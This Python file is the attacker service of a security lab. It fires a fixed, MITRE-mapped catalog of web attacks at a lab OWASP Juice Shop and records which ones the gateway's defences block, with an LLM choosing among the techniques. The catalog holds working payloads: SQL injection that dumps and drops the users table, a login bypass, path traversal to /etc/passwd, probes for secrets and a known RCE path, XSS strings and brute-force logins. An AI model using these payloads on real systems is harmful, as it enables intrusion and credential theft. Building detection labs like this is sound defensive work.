"""EdgeGuard Attack Lab — attacker executor (run inside edge-attacker container).

A tiny HTTP service that fires pre-defined, MITRE-mapped attack techniques at
the lab victim (OWASP Juice Shop via the gateway Traefik). Techniques are
FIXED CATALOG entries — the LLM only SELECTS from this catalog, it never
generates raw payloads (safety rule: deterministic payloads, AI-driven selection).

Endpoints:
  GET  /health
  POST /execute  body: {"techniques": ["T1190.sqli-search", ...],
                        "target_host": "juicelab.lab.local", "delay_ms": 120}
Returns per-technique results (every request + response code) and the
container's own IP (what CrowdSec sees as the attacker source).
"""

import http.server
import json
import socket
import time
import urllib.request
import urllib.error

TARGET_PORT = 80  # traefik "pilot" entrypoint inside edge_web

# ---------------------------------------------------------------------------
# Technique catalog — payloads are fixed, curated HTTP attacks mapped to
# MITRE ATT&CK identifiers. Juice Shop endpoints + generic probes.
# ---------------------------------------------------------------------------


def _t(name, mitre, description, requests):
    return {"id": name, "mitre": mitre, "description": description,
            "requests": requests}


CATALOG = {
    "T1190.sqli-search": _t(
        "T1190.sqli-search", "T1190", "SQL injection in product search",
        [
            {"method": "GET", "path": "/rest/products/search?q=%27%20OR%201%3D1--"},
            {"method": "GET", "path": "/rest/products/search?q=%27%20UNION%20SELECT%20id%2Cemail%2Cpassword%20FROM%20users--"},
            {"method": "GET", "path": "/rest/products/search?q=1%27%3BDROP%20TABLE%20users--"},
        ],
    ),
    "T1190.sqli-login": _t(
        "T1190.sqli-login", "T1190", "SQL injection login bypass",
        [
            {"method": "POST", "path": "/rest/user/login",
             "body": {"email": "' OR 1=1--", "password": "x"}},
        ],
    ),
    "T1083.lfi-path": _t(
        "T1083.lfi-path", "T1083", "Path traversal / local file inclusion",
        [
            {"method": "GET", "path": "/rest/products/search?q=..%2f..%2f..%2fetc%2fpasswd"},
            {"method": "GET", "path": "/../../etc/passwd", "path_as_is": True},
            {"method": "GET", "path": "/ftp/..%2f..%2f..%2fetc%2fpasswd"},
        ],
    ),
    "T1190.sensitive-probe": _t(
        "T1190.sensitive-probe", "T1190", "Sensitive file / config probe",
        [
            {"method": "GET", "path": "/.env"},
            {"method": "GET", "path": "/.git/config"},
            {"method": "GET", "path": "/phpunit/src/Util/PHP/eval-stdin.php"},
        ],
    ),
    "T1059.007.xss": _t(
        "T1059.007.xss", "T1059.007", "Cross-site scripting probe",
        [
            {"method": "GET", "path": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"},
            {"method": "GET", "path": "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"},
        ],
    ),
    "T1110.bruteforce": _t(
        "T1110.bruteforce", "T1110", "Credential brute force (6 attempts)",
        [
            {"method": "POST", "path": "/rest/user/login",
             "body": {"email": f"user{i}@juice-sh.op", "password": f"pass{i}"}}
            for i in range(1, 7)
        ],
    ),
    "T1595.scan": _t(
        "T1595.scan", "T1595", "Active scanning of common paths",
        [
            {"method": "GET", "path": "/robots.txt"},
            {"method": "GET", "path": "/admin"},
            {"method": "GET", "path": "/api"},
        ],
    ),
}


def _fire(target_host: str, req: dict) -> dict:
    # Connect to the gateway Traefik directly (same docker network, no DNS
    # needed) and set the Host header to the victim's virtual host.
    url = f"http://traefik:{TARGET_PORT}{req['path']}"
    body = json.dumps(req["body"]).encode() if "body" in req else None
    headers = {"Content-Type": "application/json",
               "User-Agent": "edgeguard-lab-attacker/1.0",
               "Host": target_host}
    data = body
    r = urllib.request.Request(url, data=data, headers=headers,
                               method=req.get("method", "GET"))
    start = time.time()
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            status, snippet = resp.status, resp.read(120).decode(errors="replace")
    except urllib.error.HTTPError as e:
        status, snippet = e.code, e.read(120).decode(errors="replace")
    except Exception as e:  # noqa: BLE001
        return {"path": req["path"], "status": 0, "error": str(e)[:120],
                "ms": int((time.time() - start) * 1000)}
    return {"path": req["path"], "status": status,
            "blocked": status == 403,
            "snippet": snippet[:100],
            "ms": int((time.time() - start) * 1000)}


def execute(plan: dict) -> dict:
    target_host = plan.get("target_host", "juicelab.lab.local")
    delay = int(plan.get("delay_ms", 150)) / 1000.0
    results = []
    for tid in plan.get("techniques", []):
        tech = CATALOG.get(tid)
        if not tech:
            results.append({"id": tid, "error": "unknown technique"})
            continue
        reqs = [_fire(target_host, r) for r in tech["requests"]]
        blocked = sum(1 for r in reqs if r.get("blocked"))
        results.append({
            "id": tid, "mitre": tech["mitre"],
            "description": tech["description"],
            "requests": reqs, "requests_total": len(reqs),
            "requests_blocked": blocked,
            "detected": blocked > 0,
        })
        time.sleep(delay)
    return {"target_host": target_host,
            "attacker_ip": socket.gethostbyname(socket.gethostname()),
            "techniques": results}


class Handler(http.server.BaseHTTPRequestHandler):
    def _json(self, code: int, obj: dict) -> None:
        body = json.dumps(obj, ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/health":
            self._json(200, {"ok": True})
        elif self.path == "/catalog":
            self._json(200, {"techniques": list(CATALOG.keys())})
        else:
            self._json(404, {"error": "not found"})

    def do_POST(self):
        if self.path != "/execute":
            self._json(404, {"error": "not found"})
            return
        length = int(self.headers.get("Content-Length") or 0)
        try:
            plan = json.loads(self.rfile.read(length) or "{}")
        except json.JSONDecodeError:
            self._json(400, {"error": "bad json"})
            return
        try:
            self._json(200, execute(plan))
        except Exception as e:  # noqa: BLE001
            self._json(500, {"error": str(e)[:200]})

    def log_message(self, *args):  # quiet
        pass


if __name__ == "__main__":
    http.server.HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
